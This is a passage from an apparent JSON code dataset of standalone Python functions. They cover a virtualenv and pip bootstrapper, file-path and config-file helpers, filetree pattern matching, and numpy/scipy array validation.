print_message()\n\n    return result"
        ],
        [
            "def error_handler(func):\n    \"\"\"Decorator to error handling.\"\"\"\n    @wraps(func)\n    def wrapper(*args, **kwargs):\n        \"\"\"\n        Run actual function and if exception catched and error handler enabled\n        put traceback to log file\n        \"\"\"\n        try:\n            return func(*args, **kwargs)\n        except BaseException as err:\n            # Do not catch exceptions on testing\n            if BOOTSTRAPPER_TEST_KEY in os.environ:\n                raise\n            # Fail silently if error handling disabled\n            if ERROR_HANDLER_DISABLED:\n                return True\n            # Otherwise save traceback to log\n            return save_traceback(err)\n    return wrapper"
        ],
        [
            "def install(env, requirements, args, ignore_activated=False,\n            install_dev_requirements=False, quiet=False):\n    \"\"\"Install library or project into virtual environment.\n\n    :param env: Use given virtual environment name.\n    :param requirements: Use given requirements file for pip.\n    :param args: Pass given arguments to pip script.\n    :param ignore_activated:\n        Do not run pip inside already activated virtual environment. By\n        default: False\n    :param install_dev_requirements:\n        When enabled install prefixed or suffixed dev requirements after\n        original installation process completed. By default: False\n    :param quiet: Do not output message to terminal. By default: False\n    \"\"\"\n    if os.path.isfile(requirements):\n        args += ('-r', requirements)\n        label = 'project'\n    else:\n        args += ('-U', '-e', '.')\n        label = 'library'\n\n    # Attempt to install development requirements\n    if install_dev_requirements:\n        dev_requirements = None\n        dirname = os.path.dirname(requirements)\n        basename, ext = os.path.splitext(os.path.basename(requirements))\n\n        # Possible dev requirements files:\n        #\n        # * <requirements>-dev.<ext>\n        # * dev-<requirements>.<ext>\n        # * <requirements>_dev.<ext>\n        # * dev_<requirements>.<ext>\n        # * <requirements>dev.<ext>\n        # * dev<requirements>.<ext>\n        #\n        # Where <requirements> is basename of given requirements file to use\n        # and <ext> is its extension.\n        for delimiter in ('-', '_', ''):\n            filename = os.path.join(\n                dirname, ''.join((basename, delimiter, 'dev', ext))\n            )\n            if os.path.isfile(filename):\n                dev_requirements = filename\n                break\n\n            filename = os.path.join(\n                dirname, ''.join(('dev', delimiter, basename, ext))\n            )\n            if os.path.isfile(filename):\n                dev_requirements = filename\n                break\n\n        # If at least one dev requirements file found, install dev requirements\n        if dev_requirements:\n            args += ('-r', dev_requirements)\n\n    if not quiet:\n        print_message('== Step 2. Install {0} =='.format(label))\n\n    result = not pip_cmd(env,\n                         ('install', ) + args,\n                         ignore_activated,\n                         echo=not quiet)\n\n    if not quiet:\n        print_message()\n\n    return result"
        ],
        [
            "def iteritems(data, **kwargs):\n    \"\"\"Iterate over dict items.\"\"\"\n    return iter(data.items(**kwargs)) if IS_PY3 else data.iteritems(**kwargs)"
        ],
        [
            "def iterkeys(data, **kwargs):\n    \"\"\"Iterate over dict keys.\"\"\"\n    return iter(data.keys(**kwargs)) if IS_PY3 else data.iterkeys(**kwargs)"
        ],
        [
            "def main(*args):\n    r\"\"\"Bootstrap Python projects and libraries with virtualenv and pip.\n\n    Also check system requirements before bootstrap and run post bootstrap\n    hook if any.\n\n    :param \\*args: Command line arguments list.\n    \"\"\"\n    # Create parser, read arguments from direct input or command line\n    with disable_error_handler():\n        args = parse_args(args or sys.argv[1:])\n\n    # Read current config from file and command line arguments\n    config = read_config(args.config, args)\n    if config is None:\n        return True\n    bootstrap = config[__script__]\n\n    # Check pre-requirements\n    if not check_pre_requirements(bootstrap['pre_requirements']):\n        return True\n\n    # Create virtual environment\n    env_args = prepare_args(config['virtualenv'], bootstrap)\n    if not create_env(\n        bootstrap['env'],\n        env_args,\n        bootstrap['recreate'],\n        bootstrap['ignore_activated'],\n        bootstrap['quiet']\n    ):\n        # Exit if couldn't create virtual environment\n        return True\n\n    # And install library or project here\n    pip_args = prepare_args(config['pip'], bootstrap)\n    if not install(\n        bootstrap['env'],\n        bootstrap['requirements'],\n        pip_args,\n        bootstrap['ignore_activated'],\n        bootstrap['install_dev_requirements'],\n        bootstrap['quiet']\n    ):\n        # Exist if couldn't install requirements into venv\n        return True\n\n    # Run post-bootstrap hook\n    run_hook(bootstrap['hook'], bootstrap, bootstrap['quiet'])\n\n    # All OK!\n    if not bootstrap['quiet']:\n        print_message('All OK!')\n\n    # False means everything went alright, exit code: 0\n    return False"
        ],
        [
            "def parse_args(args):\n    \"\"\"\n    Parse args from command line by creating argument parser instance and\n    process it.\n\n    :param args: Command line arguments list.\n    \"\"\"\n    from argparse import ArgumentParser\n\n    description = ('Bootstrap Python projects and libraries with virtualenv '\n                   'and pip.')\n    parser = ArgumentParser(description=description)\n    parser.add_argument('--version', action='version', version=__version__)\n\n    parser.add_argument(\n        '-c', '--config', default=DEFAULT_CONFIG,\n        help='Path to config file. By default: {0}'.format(DEFAULT_CONFIG)\n    )\n    parser.add_argument(\n        '-p', '--pre-requirements', default=[], nargs='+',\n        help='List of pre-requirements to check, separated by space.'\n    )\n    parser.add_argument(\n        '-e', '--env',\n        help='Virtual environment name. By default: {0}'.\n             format(CONFIG[__script__]['env'])\n    )\n    parser.add_argument(\n        '-r', '--requirements',\n        help='Path to requirements file. By default: {0}'.\n             format(CONFIG[__script__]['requirements'])\n    )\n    parser.add_argument(\n        '-d', '--install-dev-requirements', action='store_true', default=None,\n        help='Install prefixed or suffixed \"dev\" requirements after '\n             'installation of original requirements file or library completed '\n             'without errors.'\n    )\n    parser.add_argument(\n        '-C', '--hook', help='Execute this hook after bootstrap process.'\n    )\n    parser.add_argument(\n        '--ignore-activated', action='store_true', default=None,\n        help='Ignore pre-activated virtualenv, like on Travis CI.'\n    )\n    parser.add_argument(\n        '--recreate', action='store_true', default=None,\n        help='Recreate virtualenv on every run.'\n    )\n    parser.add_argument(\n        '-q', '--quiet', action='store_true', default=None,\n        help='Minimize output, show only error messages.'\n    )\n\n    return parser.parse_args(args)"
        ],
        [
            "def pip_cmd(env, cmd, ignore_activated=False, **kwargs):\n    r\"\"\"Run pip command in given or activated virtual environment.\n\n    :param env: Virtual environment name.\n    :param cmd: Pip subcommand to run.\n    :param ignore_activated:\n        Ignore activated virtual environment and use given venv instead. By\n        default: False\n    :param \\*\\*kwargs:\n        Additional keyword arguments to be passed to :func:`~run_cmd`\n    \"\"\"\n    cmd = tuple(cmd)\n    dirname = safe_path(env)\n\n    if not ignore_activated:\n        activated_env = os.environ.get('VIRTUAL_ENV')\n\n        if hasattr(sys, 'real_prefix'):\n            dirname = sys.prefix\n        elif activated_env:\n            dirname = activated_env\n\n    pip_path = os.path.join(dirname, 'Scripts' if IS_WINDOWS else 'bin', 'pip')\n\n    if kwargs.pop('return_path', False):\n        return pip_path\n\n    if not os.path.isfile(pip_path):\n        raise OSError('No pip found at {0!r}'.format(pip_path))\n\n    # Disable pip version check in tests\n    if BOOTSTRAPPER_TEST_KEY in os.environ and cmd[0] == 'install':\n        cmd = list(cmd)\n        cmd.insert(1, '--disable-pip-version-check')\n        cmd = tuple(cmd)\n\n    with disable_error_handler():\n        return run_cmd((pip_path, ) + cmd, **kwargs)"
        ],
        [
            "def prepare_args(config, bootstrap):\n    \"\"\"Convert config dict to command line args line.\n\n    :param config: Configuration dict.\n    :param bootstrap: Bootstrapper configuration dict.\n    \"\"\"\n    config = copy.deepcopy(config)\n    environ = dict(copy.deepcopy(os.environ))\n\n    data = {'env': bootstrap['env'],\n            'pip': pip_cmd(bootstrap['env'], '', return_path=True),\n            'requirements': bootstrap['requirements']}\n    environ.update(data)\n\n    if isinstance(config, string_types):\n        return config.format(**environ)\n\n    for key, value in iteritems(config):\n        if not isinstance(value, string_types):\n            continue\n        config[key] = value.format(**environ)\n\n    return config_to_args(config)"
        ],
        [
            "def print_error(message, wrap=True):\n    \"\"\"Print error message to stderr, using ANSI-colors.\n\n    :param message: Message to print\n    :param wrap:\n        Wrap message into ``ERROR: <message>. Exit...`` template. By default:\n        True\n    \"\"\"\n    if wrap:\n        message = 'ERROR: {0}. Exit...'.format(message.rstrip('.'))\n\n    colorizer = (_color_wrap(colorama.Fore.RED)\n                 if colorama\n                 else lambda message: message)\n    return print(colorizer(message), file=sys.stderr)"
        ],
        [
            "def print_message(message=None):\n    \"\"\"Print message via ``subprocess.call`` function.\n\n    This helps to ensure consistent output and avoid situations where print\n    messages actually shown after messages from all inner threads.\n\n    :param message: Text message to print.\n    \"\"\"\n    kwargs = {'stdout': sys.stdout,\n              'stderr': sys.stderr,\n              'shell': True}\n    return subprocess.call('echo \"{0}\"'.format(message or ''), **kwargs)"
        ],
        [
            "def read_config(filename, args):\n    \"\"\"\n    Read and parse configuration file. By default, ``filename`` is relative\n    path to current work directory.\n\n    If no config file found, default ``CONFIG`` would be used.\n\n    :param filename: Read config from given filename.\n    :param args: Parsed command line arguments.\n    \"\"\"\n    # Initial vars\n    config = defaultdict(dict)\n    splitter = operator.methodcaller('split', ' ')\n\n    converters = {\n        __script__: {\n            'env': safe_path,\n            'pre_requirements': splitter,\n        },\n        'pip': {\n            'allow_external': splitter,\n            'allow_unverified': splitter,\n        }\n    }\n    default = copy.deepcopy(CONFIG)\n    sections = set(iterkeys(default))\n\n    # Append download-cache for old pip versions\n    if int(getattr(pip, '__version__', '1.x').split('.')[0]) < 6:\n        default['pip']['download_cache'] = safe_path(os.path.expanduser(\n            os.path.join('~', '.{0}'.format(__script__), 'pip-cache')\n        ))\n\n    # Expand user and environ vars in config filename\n    is_default = filename == DEFAULT_CONFIG\n    filename = os.path.expandvars(os.path.expanduser(filename))\n\n    # Read config if it exists on disk\n    if not is_default and not os.path.isfile(filename):\n        print_error('Config file does not exist at {0!r}'.format(filename))\n        return None\n\n    parser = ConfigParser()\n\n    try:\n        parser.read(filename)\n    except ConfigParserError:\n        print_error('Cannot parse config file at {0!r}'.format(filename))\n        return None\n\n    # Apply config for each possible section\n    for section in sections:\n        if not parser.has_section(section):\n            continue\n\n        items = parser.items(section)\n\n        # Make auto convert here for integers and boolean values\n        for key, value in items:\n            try:\n                value = int(value)\n            except (TypeError, ValueError):\n                try:\n                    value = bool(strtobool(value))\n                except ValueError:\n                    pass\n\n            if section in converters and key in converters[section]:\n                value = converters[section][key](value)\n\n            config[section][key] = value\n\n    # Update config with default values if necessary\n    for section, data in iteritems(default):\n        if section not in config:\n            config[section] = data\n        else:\n            for key, value in iteritems(data):\n                config[section].setdefault(key, value)\n\n    # Update bootstrap config from parsed args\n    keys = set((\n        'env', 'hook', 'install_dev_requirements', 'ignore_activated',\n        'pre_requirements', 'quiet', 'recreate', 'requirements'\n    ))\n\n    for key in keys:\n        value = getattr(args, key)\n        config[__script__].setdefault(key, value)\n\n        if key == 'pre_requirements' and not value:\n            continue\n\n        if value is not None:\n            config[__script__][key] = value\n\n    return config"
        ],
        [
            "def run_cmd(cmd, echo=False, fail_silently=False, **kwargs):\n    r\"\"\"Call given command with ``subprocess.call`` function.\n\n    :param cmd: Command to run.\n    :type cmd: tuple or str\n    :param echo:\n        If enabled show command to call and its output in STDOUT, otherwise\n        hide all output. By default: False\n    :param fail_silently: Do not raise exception on error. By default: False\n    :param \\*\\*kwargs:\n        Additional keyword arguments to be passed to ``subprocess.call``\n        function. STDOUT and STDERR streams would be setup inside of function\n        to ensure hiding command output in case of disabling ``echo``.\n    \"\"\"\n    out, err = None, None\n\n    if echo:\n        cmd_str = cmd if isinstance(cmd, string_types) else ' '.join(cmd)\n        kwargs['stdout'], kwargs['stderr'] = sys.stdout, sys.stderr\n        print_message('$ {0}'.format(cmd_str))\n    else:\n        out, err = get_temp_streams()\n        kwargs['stdout'], kwargs['stderr'] = out, err\n\n    try:\n        retcode = subprocess.call(cmd, **kwargs)\n    except subprocess.CalledProcessError as err:\n        if fail_silently:\n            return False\n        print_error(str(err) if IS_PY3 else unicode(err))  # noqa\n    finally:\n        if out:\n            out.close()\n        if err:\n            err.close()\n\n    if retcode and echo and not fail_silently:\n        print_error('Command {0!r} returned non-zero exit status {1}'.\n                    format(cmd_str, retcode))\n\n    return retcode"
        ],
        [
            "def run_hook(hook, config, quiet=False):\n    \"\"\"Run post-bootstrap hook if any.\n\n    :param hook: Hook to run.\n    :param config: Configuration dict.\n    :param quiet: Do not output messages to STDOUT/STDERR. By default: False\n    \"\"\"\n    if not hook:\n        return True\n\n    if not quiet:\n        print_message('== Step 3. Run post-bootstrap hook ==')\n\n    result = not run_cmd(prepare_args(hook, config),\n                         echo=not quiet,\n                         fail_silently=True,\n                         shell=True)\n\n    if not quiet:\n        print_message()\n\n    return result"
        ],
        [
            "def save_traceback(err):\n    \"\"\"Save error traceback to bootstrapper log file.\n\n    :param err: Catched exception.\n    \"\"\"\n    # Store logs to ~/.bootstrapper directory\n    dirname = safe_path(os.path.expanduser(\n        os.path.join('~', '.{0}'.format(__script__))\n    ))\n\n    # But ensure that directory exists\n    if not os.path.isdir(dirname):\n        os.mkdir(dirname)\n\n    # Now we ready to put traceback to log file\n    filename = os.path.join(dirname, '{0}.log'.format(__script__))\n\n    with open(filename, 'a+') as handler:\n        traceback.print_exc(file=handler)\n\n    # And show colorized message\n    message = ('User aborted workflow'\n               if isinstance(err, KeyboardInterrupt)\n               else 'Unexpected error catched')\n    print_error(message)\n    print_error('Full log stored to {0}'.format(filename), False)\n\n    return True"
        ],
        [
            "def smart_str(value, encoding='utf-8', errors='strict'):\n    \"\"\"Convert Python object to string.\n\n    :param value: Python object to convert.\n    :param encoding: Encoding to use if in Python 2 given object is unicode.\n    :param errors: Errors mode to use if in Python 2 given object is unicode.\n    \"\"\"\n    if not IS_PY3 and isinstance(value, unicode):  # noqa\n        return value.encode(encoding, errors)\n    return str(value)"
        ],
        [
            "def copy_w_plus(src, dst):\n    \"\"\"Copy file from `src` path to `dst` path. If `dst` already exists, will add '+' characters\n    to the end of the basename without extension.\n\n    Parameters\n    ----------\n    src: str\n\n    dst: str\n\n    Returns\n    -------\n    dstpath: str\n    \"\"\"\n    dst_ext = get_extension(dst)\n    dst_pre = remove_ext   (dst)\n\n    while op.exists(dst_pre + dst_ext):\n        dst_pre += '+'\n\n    shutil.copy(src, dst_pre + dst_ext)\n\n    return dst_pre + dst_ext"
        ],
        [
            "def get_abspath(folderpath):\n    \"\"\"Returns the absolute path of folderpath.\n    If the path does not exist, will raise IOError.\n    \"\"\"\n    if not op.exists(folderpath):\n        raise FolderNotFound(folderpath)\n\n    return op.abspath(folderpath)"
        ],
        [
            "def get_extension(filepath, check_if_exists=False, allowed_exts=ALLOWED_EXTS):\n    \"\"\"Return the extension of fpath.\n\n    Parameters\n    ----------\n    fpath: string\n    File name or path\n\n    check_if_exists: bool\n\n    allowed_exts: dict\n    Dictionary of strings, where the key if the last part of a complex ('.' separated) extension\n    and the value is the previous part.\n    For example: for the '.nii.gz' extension I would have a dict as {'.gz': ['.nii',]}\n\n    Returns\n    -------\n    str\n    The extension of the file name or path\n    \"\"\"\n    if check_if_exists:\n        if not op.exists(filepath):\n            raise IOError('File not found: ' + filepath)\n\n    rest, ext = op.splitext(filepath)\n    if ext in allowed_exts:\n        alloweds = allowed_exts[ext]\n        _, ext2 = op.splitext(rest)\n        if ext2 in alloweds:\n            ext = ext2 + ext\n\n    return ext"
        ],
        [
            "def add_extension_if_needed(filepath, ext, check_if_exists=False):\n    \"\"\"Add the extension ext to fpath if it doesn't have it.\n\n    Parameters\n    ----------\n    filepath: str\n    File name or path\n\n    ext: str\n    File extension\n\n    check_if_exists: bool\n\n    Returns\n    -------\n    File name or path with extension added, if needed.\n    \"\"\"\n    if not filepath.endswith(ext):\n        filepath += ext\n\n    if check_if_exists:\n        if not op.exists(filepath):\n            raise IOError('File not found: ' + filepath)\n\n    return filepath"
        ],
        [
            "def join_path_to_filelist(path, filelist):\n    \"\"\"Joins path to each line in filelist\n\n    Parameters\n    ----------\n    path: str\n\n    filelist: list of str\n\n    Returns\n    -------\n    list of filepaths\n    \"\"\"\n    return [op.join(path, str(item)) for item in filelist]"
        ],
        [
            "def remove_all(filelist, folder=''):\n    \"\"\"Deletes all files in filelist\n\n    Parameters\n    ----------\n    filelist: list of str\n        List of the file paths to be removed\n\n    folder: str\n        Path to be used as common directory for all file paths in filelist\n    \"\"\"\n    if not folder:\n        for f in filelist:\n            os.remove(f)\n    else:\n        for f in filelist:\n            os.remove(op.join(folder, f))"
        ],
        [
            "def ux_file_len(filepath):\n    \"\"\"Returns the length of the file using the 'wc' GNU command\n\n    Parameters\n    ----------\n    filepath: str\n\n    Returns\n    -------\n    float\n    \"\"\"\n    p = subprocess.Popen(['wc', '-l', filepath], stdout=subprocess.PIPE,\n                         stderr=subprocess.PIPE)\n    result, err = p.communicate()\n\n    if p.returncode != 0:\n        raise IOError(err)\n\n    l = result.strip()\n    l = int(l.split()[0])\n    return l"
        ],
        [
            "def merge(dict_1, dict_2):\n    \"\"\"Merge two dictionaries.\n\n    Values that evaluate to true take priority over falsy values.\n    `dict_1` takes priority over `dict_2`.\n\n    \"\"\"\n    return dict((str(key), dict_1.get(key) or dict_2.get(key))\n                for key in set(dict_2) | set(dict_1))"
        ],
        [
            "def get_sys_path(rcpath, app_name, section_name=None):\n    \"\"\"Return a folder path if it exists.\n\n    First will check if it is an existing system path, if it is, will return it\n    expanded and absoluted.\n\n    If this fails will look for the rcpath variable in the app_name rcfiles or\n    exclusively within the given section_name, if given.\n\n    Parameters\n    ----------\n    rcpath: str\n        Existing folder path or variable name in app_name rcfile with an\n        existing one.\n\n    section_name: str\n        Name of a section in the app_name rcfile to look exclusively there for\n        variable names.\n\n    app_name: str\n        Name of the application to look for rcfile configuration files.\n\n    Returns\n    -------\n    sys_path: str\n        A expanded absolute file or folder path if the path exists.\n\n    Raises\n    ------\n    IOError if the proposed sys_path does not exist.\n    \"\"\"\n    # first check if it is an existing path\n    if op.exists(rcpath):\n        return op.realpath(op.expanduser(rcpath))\n\n    # look for the rcfile\n    try:\n        settings = rcfile(app_name, section_name)\n    except:\n        raise\n\n    # look for the variable within the rcfile configutarions\n    try:\n        sys_path = op.expanduser(settings[rcpath])\n    except KeyError:\n        raise IOError('Could not find an existing variable with name {0} in'\n                      ' section {1} of {2}rc config setup. Maybe it is a '\n                      ' folder that could not be found.'.format(rcpath,\n                                                                section_name,\n                                                                app_name))\n    # found the variable, now check if it is an existing path\n    else:\n        if not op.exists(sys_path):\n            raise IOError('Could not find the path {3} indicated by the '\n                          'variable {0} in section {1} of {2}rc config '\n                          'setup.'.format(rcpath, section_name, app_name,\n                                          sys_path))\n\n        # expand the path and return\n        return op.realpath(op.expanduser(sys_path))"
        ],
        [
            "def rcfile(appname, section=None, args={}, strip_dashes=True):\n    \"\"\"Read environment variables and config files and return them merged with\n    predefined list of arguments.\n\n    Parameters\n    ----------\n    appname: str\n        Application name, used for config files and environment variable\n        names.\n\n    section: str\n        Name of the section to be read. If this is not set: appname.\n\n    args:\n        arguments from command line (optparse, docopt, etc).\n\n    strip_dashes: bool\n        Strip dashes prefixing key names from args dict.\n\n    Returns\n    --------\n    dict\n        containing the merged variables of environment variables, config\n        files and args.\n\n    Raises\n    ------\n    IOError\n        In case the return value is empty.\n\n    Notes\n    -----\n    Environment variables are read if they start with appname in uppercase\n    with underscore, for example:\n\n        TEST_VAR=1\n\n    Config files compatible with ConfigParser are read and the section name\n    appname is read, example:\n\n        [appname]\n        var=1\n\n    We can also have host-dependent configuration values, which have\n    priority over the default appname values.\n\n        [appname]\n        var=1\n\n        [appname:mylinux]\n        var=3\n\n\n    For boolean flags do not try to use: 'True' or 'False',\n                                         'on' or 'off',\n                                         '1' or '0'.\n    Unless you are willing to parse this values by yourself.\n    We recommend commenting the variables out with '#' if you want to set a\n    flag to False and check if it is in the rcfile cfg dict, i.e.:\n\n        flag_value = 'flag_variable' in cfg\n\n\n    Files are read from: /etc/appname/config,\n                         /etc/appfilerc,\n                         ~/.config/appname/config,\n                         ~/.config/appname,\n                         ~/.appname/config,\n                         ~/.appnamerc,\n                         appnamerc,\n                         .appnamerc,\n                         appnamerc file found in 'path' folder variable in args,\n                         .appnamerc file found in 'path' folder variable in args,\n                         file provided by 'config' variable in args.\n\n    Example\n    -------\n        args = rcfile(__name__, docopt(__doc__, version=__version__))\n    \"\"\"\n    if strip_dashes:\n        for k in args.keys():\n            args[k.lstrip('-')] = args.pop(k)\n\n    environ = get_environment(appname)\n\n    if section is None:\n        section = appname\n\n    config = get_config(appname,\n                        section,\n                        args.get('config', ''),\n                        args.get('path', ''))\n    config = merge(merge(args, config), environ)\n\n    if not config:\n        raise IOError('Could not find any rcfile for application '\n                      '{}.'.format(appname))\n\n    return config"
        ],
        [
            "def get_rcfile_section(app_name, section_name):\n    \"\"\" Return the dictionary containing the rcfile section configuration\n    variables.\n\n    Parameters\n    ----------\n    section_name: str\n        Name of the section in the rcfiles.\n\n    app_name: str\n        Name of the application to look for its rcfiles.\n\n    Returns\n    -------\n    settings: dict\n        Dict with variable values\n    \"\"\"\n    try:\n        settings = rcfile(app_name, section_name)\n    except IOError:\n        raise\n    except:\n        raise KeyError('Error looking for section {} in {} '\n                       ' rcfiles.'.format(section_name, app_name))\n    else:\n        return settings"
        ],
        [
            "def get_rcfile_variable_value(var_name, app_name, section_name=None):\n    \"\"\" Return the value of the variable in the section_name section of the\n    app_name rc file.\n\n    Parameters\n    ----------\n    var_name: str\n        Name of the variable to be searched for.\n\n    section_name: str\n        Name of the section in the rcfiles.\n\n    app_name: str\n        Name of the application to look for its rcfiles.\n\n    Returns\n    -------\n    var_value: str\n        The value of the variable with given var_name.\n    \"\"\"\n    cfg = get_rcfile_section(app_name, section_name)\n\n    if var_name in cfg:\n        raise KeyError('Option {} not found in {} '\n                       'section.'.format(var_name, section_name))\n\n    return cfg[var_name]"
        ],
        [
            "def find_in_sections(var_name, app_name):\n    \"\"\" Return the section and the value of the variable where the first\n    var_name is found in the app_name rcfiles.\n\n    Parameters\n    ----------\n    var_name: str\n        Name of the variable to be searched for.\n\n    app_name: str\n        Name of the application to look for its rcfiles.\n\n    Returns\n    -------\n    section_name: str\n        Name of the section in the rcfiles where var_name was first found.\n\n    var_value: str\n        The value of the first variable with given var_name.\n    \"\"\"\n    sections = get_sections(app_name)\n\n    if not sections:\n        raise ValueError('No sections found in {} rcfiles.'.format(app_name))\n\n    for s in sections:\n        try:\n            var_value = get_rcfile_variable_value(var_name, section_name=s,\n                                                  app_name=app_name)\n        except:\n            pass\n        else:\n            return s, var_value\n\n    raise KeyError('No variable {} has been found in {} '\n                   'rcfiles.'.format(var_name, app_name))"
        ],
        [
            "def filter_list(lst, pattern):\n    \"\"\"\n    Filters the lst using pattern.\n    If pattern starts with '(' it will be considered a re regular expression,\n    otherwise it will use fnmatch filter.\n\n    :param lst: list of strings\n\n    :param pattern: string\n\n    :return: list of strings\n    Filtered list of strings\n    \"\"\"\n    if is_fnmatch_regex(pattern) and not is_regex(pattern):\n        #use fnmatch\n        log.info('Using fnmatch for {0}'.format(pattern))\n        filst = fnmatch.filter(lst, pattern)\n\n    else:\n        #use re\n        log.info('Using regex match for {0}'.format(pattern))\n        filst = match_list(lst, pattern)\n\n    if filst:\n        filst.sort()\n\n    return filst"
        ],
        [
            "def get_subdict(adict, path, sep=os.sep):\n    \"\"\"\n    Given a nested dictionary adict.\n    This returns its childen just below the path.\n    The path is a string composed of adict keys separated by sep.\n\n    :param adict: nested dict\n\n    :param path: str\n\n    :param sep: str\n\n    :return: dict or list or leaf of treemap\n\n    \"\"\"\n    return reduce(adict.__class__.get, [p for p in op.split(sep) if p], adict)"
        ],
        [
            "def get_dict_leaves(data):\n    \"\"\"\n    Given a nested dictionary, this returns all its leave elements in a list.\n\n    :param adict:\n\n    :return: list\n    \"\"\"\n    result = []\n    if isinstance(data, dict):\n        for item in data.values():\n            result.extend(get_dict_leaves(item))\n    elif isinstance(data, list):\n        result.extend(data)\n    else:\n        result.append(data)\n\n    return result"
        ],
        [
            "def get_possible_paths(base_path, path_regex):\n    \"\"\"\n    Looks for path_regex within base_path. Each match is append\n    in the returned list.\n    path_regex may contain subfolder structure.\n    If any part of the folder structure is a\n\n    :param base_path: str\n\n    :param path_regex: str\n\n    :return list of strings\n    \"\"\"\n    if not path_regex:\n        return []\n\n    if len(path_regex) < 1:\n        return []\n\n    if path_regex[0] == os.sep:\n        path_regex = path_regex[1:]\n\n    rest_files = ''\n    if os.sep in path_regex:\n        #split by os.sep\n        node_names = path_regex.partition(os.sep)\n        first_node = node_names[0]\n        rest_nodes = node_names[2]\n\n        folder_names = filter_list(os.listdir(base_path), first_node)\n\n        for nom in folder_names:\n            new_base = op.join(base_path, nom)\n            if op.isdir(new_base):\n                rest_files = get_possible_paths(new_base, rest_nodes)\n    else:\n        rest_files = filter_list(os.listdir(base_path), path_regex)\n\n    files = []\n    if rest_files:\n        files = [op.join(base_path, f) for f in rest_files]\n\n    return files"
        ],
        [
            "def create_folder(dirpath, overwrite=False):\n        \"\"\" Will create dirpath folder. If dirpath already exists and overwrite is False,\n        will append a '+' suffix to dirpath until dirpath does not exist.\"\"\"\n        if not overwrite:\n            while op.exists(dirpath):\n                dirpath += '+'\n\n        os.makedirs(dirpath, exist_ok=overwrite)\n        return dirpath"
        ],
        [
            "def _import_config(filepath):\n        \"\"\"\n        Imports filetree and root_path variable values from the filepath.\n\n        :param filepath:\n        :return: root_path and filetree\n        \"\"\"\n        if not op.isfile(filepath):\n            raise IOError('Data config file not found. '\n                          'Got: {0}'.format(filepath))\n\n        cfg = import_pyfile(filepath)\n\n        if not hasattr(cfg, 'root_path'):\n            raise KeyError('Config file root_path key not found.')\n\n        if not hasattr(cfg, 'filetree'):\n            raise KeyError('Config file filetree key not found.')\n\n        return cfg.root_path, cfg.filetree"
        ],
        [
            "def remove_nodes(self, pattern, adict):\n        \"\"\"\n        Remove the nodes that match the pattern.\n        \"\"\"\n        mydict = self._filetree if adict is None else adict\n\n        if isinstance(mydict, dict):\n            for nom in mydict.keys():\n                if isinstance(mydict[nom], dict):\n                    matchs = filter_list(mydict[nom], pattern)\n                    for nom in matchs:\n                        mydict = self.remove_nodes(pattern, mydict[nom])\n                        mydict.pop(nom)\n                else:\n                    mydict[nom] = filter_list(mydict[nom], pattern)\n        else:\n            matchs = set(filter_list(mydict, pattern))\n            mydict = set(mydict) - matchs\n\n        return mydict"
        ],
        [
            "def count_node_match(self, pattern, adict=None):\n        \"\"\"\n        Return the number of nodes that match the pattern.\n\n        :param pattern:\n\n        :param adict:\n        :return: int\n        \"\"\"\n        mydict = self._filetree if adict is None else adict\n\n        k = 0\n        if isinstance(mydict, dict):\n            names = mydict.keys()\n            k += len(filter_list(names, pattern))\n            for nom in names:\n                k += self.count_node_match(pattern, mydict[nom])\n        else:\n            k = len(filter_list(mydict, pattern))\n\n        return k"
        ],
        [
            "def as_float_array(X, copy=True, force_all_finite=True):\n    \"\"\"Converts an array-like to an array of floats\n\n    The new dtype will be np.float32 or np.float64, depending on the original\n    type. The function can create a copy or modify the argument depending\n    on the argument copy.\n\n    Parameters\n    ----------\n    X : {array-like, sparse matrix}\n\n    copy : bool, optional\n        If True, a copy of X will be created. If False, a copy may still be\n        returned if X's dtype is not a floating point type.\n\n    Returns\n    -------\n    XT : {array, sparse matrix}\n        An array of type np.float\n    \"\"\"\n    if isinstance(X, np.matrix) or (not isinstance(X, np.ndarray)\n                                    and not sp.issparse(X)):\n        return check_array(X, ['csr', 'csc', 'coo'], dtype=np.float64,\n                           copy=copy, force_all_finite=force_all_finite,\n                           ensure_2d=False)\n    elif sp.issparse(X) and X.dtype in [np.float32, np.float64]:\n        return X.copy() if copy else X\n    elif X.dtype in [np.float32, np.float64]:  # is numpy array\n        return X.copy('F' if X.flags['F_CONTIGUOUS'] else 'C') if copy else X\n    else:\n        return X.astype(np.float32 if X.dtype == np.int32 else np.float64)"
        ],
        [
            "def indexable(*iterables):\n    \"\"\"Make arrays indexable for cross-validation.\n\n    Checks consistent length, passes through None, and ensures that everything\n    can be indexed by converting sparse matrices to csr and converting\n    non-interable objects to arrays.\n\n    Parameters\n    ----------\n    iterables : lists, dataframes, arrays, sparse matrices\n        List of objects to ensure sliceability.\n    \"\"\"\n    result = []\n    for X in iterables:\n        if sp.issparse(X):\n            result.append(X.tocsr())\n        elif hasattr(X, \"__getitem__\") or hasattr(X, \"iloc\"):\n            result.append(X)\n        elif X is None:\n            result.append(X)\n        else:\n            result.append(np.array(X))\n    check_consistent_length(*result)\n    return result"
        ],
        [
            "def check_array(array, accept_sparse=None, dtype=None, order=None, copy=False,\n                force_all_finite=True, ensure_2d=True, allow_nd=False):\n    \"\"\"Input validation on an array, list, sparse matrix or similar.\n\n    By default, the input is converted to an at least 2nd numpy array.\n\n    Parameters\n    ----------\n    array : object\n        Input object to check / convert.\n\n    accept_sparse : string, list of string or None (default=None)\n        String[s] representing allowed sparse matrix formats, such as 'csc',\n        'csr', etc.  None means that sparse matrix input will raise an error.\n        If the input is sparse but not in the allowed format, it will be\n        converted to the first listed format.\n\n    order : 'F', 'C' or None (default=None)\n        Whether an array will be forced to be fortran or c-style.\n\n    copy : boolean (default=False)\n        Whether a forced copy will be triggered. If copy=False, a copy might\n        be triggered by a conversion.\n\n    force_all_finite : boolean (default=True)\n        Whether to raise an error on np.inf and np.nan in X.\n\n    ensure_2d : boolean (default=True)\n        Whether to make X at least 2d.\n\n    allow_nd : boolean (default=False)\n        Whether to allow X.ndim > 2.\n\n    Returns\n    -------\n    X_converted : object\n        The converted and validated X.\n    \"\"\"\n    if isinstance(accept_sparse, str):\n        accept_sparse = [accept_sparse]\n\n    if sp.issparse(array):\n        array = _ensure_sparse_format(array, accept_sparse, dtype, order,\n                                      copy, force_all_finite)\n    else:\n        if ensure_2d:\n            array = np.atleast_2d(array)\n        array = np.array(array, dtype=dtype, order=order, copy=copy)\n        if not allow_nd and array.ndim >= 3:\n            raise ValueError(\"Found array with dim %d. Expected <= 2\" %\n                             array.ndim)\n        if force_all_finite:\n            _assert_all_finite(array)\n\n    return array"
        ],
        [
